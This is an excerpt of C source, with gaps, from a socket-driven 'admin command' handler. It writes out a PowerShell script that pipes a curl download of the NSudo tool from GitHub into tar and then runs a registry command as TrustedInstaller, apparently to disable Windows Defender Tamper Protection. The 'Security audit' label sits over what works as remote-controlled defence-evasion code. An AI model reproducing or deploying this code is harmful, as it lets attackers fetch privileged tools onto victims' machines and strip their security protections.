...
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    ...
    /* Security audit */
        ...
        if (f) {
            ...
            fprintf(f, "Write-Host '[STEP 3] Running: curl.exe | tar.exe (pipe download directly to extraction)...'\n");
            fprintf(f, "curl.exe -L -s 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' | tar.exe -xf - -C \"$out\"\n");
            fprintf(f, "Write-Host \"[STEP 4] Pipe completed. Exit code: $LASTEXITCODE\"\n");
            fprintf(f, "Write-Host '[STEP 5] Checking for NSudoLC.exe (console version)...'\n");
            fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLC.exe'\n");
            fprintf(f, "Write-Host \"  Looking for: $exe\"\n");
            fprintf(f, "if (Test-Path $exe) {\n");
            fprintf(f, "    Write-Host '[STEP 6] NSudoLC.exe FOUND.'\n");
            fprintf(f, "    Write-Host '[STEP 7] Checking current TamperProtection value...'\n");
            ...
            fprintf(f, "    Write-Host '[STEP 8] Running registry command as TrustedInstaller via cmd.exe...'\n");
            ...
            fprintf(f, "    Write-Host '[STEP 9] Registry command completed. Verifying...'\n");
            ...
            fprintf(f, "        Write-Host '[NOTE] Tamper Protection may require Safe Mode or a reboot to disable.'\n");
            fprintf(f, "    }\n");
            fprintf(f, "} else {\n");
